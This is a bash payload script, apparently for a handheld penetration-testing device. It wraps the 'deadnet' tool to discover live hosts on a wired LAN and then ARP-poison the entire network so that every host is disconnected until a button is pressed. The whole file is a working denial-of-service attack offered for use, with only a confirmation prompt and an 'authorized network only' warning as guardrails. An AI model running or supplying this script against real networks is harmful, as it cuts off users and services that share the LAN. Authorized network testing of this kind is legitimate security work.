#!/bin/bash
# Title: DeadNet LAN Kill
# Author: florian (payload) / flashnuke (deadnet - https://github.com/flashnuke/deadnet)
# Description: Discovers live LAN hosts, then ARP-poisons the whole wired LAN (eth1) to disconnect them. Press B to stop.
# Version: 3.0
#
# Needs: python3, scapy (opkg install -d mmc scapy), nmap (pre-installed) for discovery
# IMPORTANT: only run against a network you are authorized to test.

LOG "Starting DeadNet LAN kill (eth1)..."

if ! CONFIRMATION_DIALOG "ARP-poison the WHOLE LAN? Authorized network only!"; then
    LOG "User cancelled."
    exit 0
fi

if [ ! -x /root/scripts/deadnet.sh ]; then
    ERROR_DIALOG "deadnet.sh not found - run the toolkit setup.py first."
    exit 1
fi

LOG "Discovering live hosts on the LAN first..."
DISCOVERY=$(/root/scripts/deadnet.sh --discover --iface eth1 -y 2>&1)
LOG "$DISCOVERY"

/root/scripts/deadnet.sh --iface eth1 --no-discover -y &

ALERT "LAN kill running - press B to stop"
LOG "Press B on the device to stop the LAN kill"
WAIT_FOR_BUTTON_PRESS B

/root/scripts/deadnet.sh --stop
LOG "LAN kill stopped."
ALERT "LAN kill stopped"
